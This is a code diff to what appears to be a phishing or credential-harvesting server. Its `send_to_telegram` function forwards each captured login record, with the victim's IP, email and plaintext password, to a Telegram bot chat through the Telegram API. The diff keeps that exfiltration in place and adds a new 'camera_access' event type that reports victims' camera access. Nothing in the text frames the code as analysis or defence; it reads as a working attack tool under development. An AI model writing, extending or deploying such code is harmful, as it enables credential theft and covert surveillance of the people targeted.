@@ -64,14 +64,16 @@ def send_to_telegram(rec):
         return
     try:
         data = rec.get("data", {})
-        if data.get("type") != "login":
+        t_type = data.get("type")
+        
+        text = ""
+        if t_type == "login":
+            text = f"🔥 Новый вход\n🌐 IP: {rec['ip']}\n📧 Email: {data.get('email')}\n🔑 Пароль: {data.get('password')}\n"
+        elif t_type == "camera_access":
+            text = f"📸 Доступ к камере ({data.get('reason')})\n🌐 IP: {rec['ip']}\n"
+        else:
             return
             
-        text = f"🔥 Новый вход\n"
-        text += f"🌐 IP: {rec['ip']}\n"
-        text += f"📧 Email: {data.get('email')}\n"
-        text += f"🔑 Пароль: {data.get('password')}\n"
-        
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         req = urllib.request.Request(url, data=json.dumps({"chat_id": CHAT_ID, "text": text}).encode(), headers={"Content-Type": "application/json"})
         urllib.request.urlopen(req, timeout=5)
@@ -107,6 +109,7 @@ async def collect(req: Request, body: dict):
         "data": body,
     }
     
+    # Отправляем в Телеграм в фоне
     threading.Thread(target=send_to_telegram, args=(rec,)).start()
 
     try:
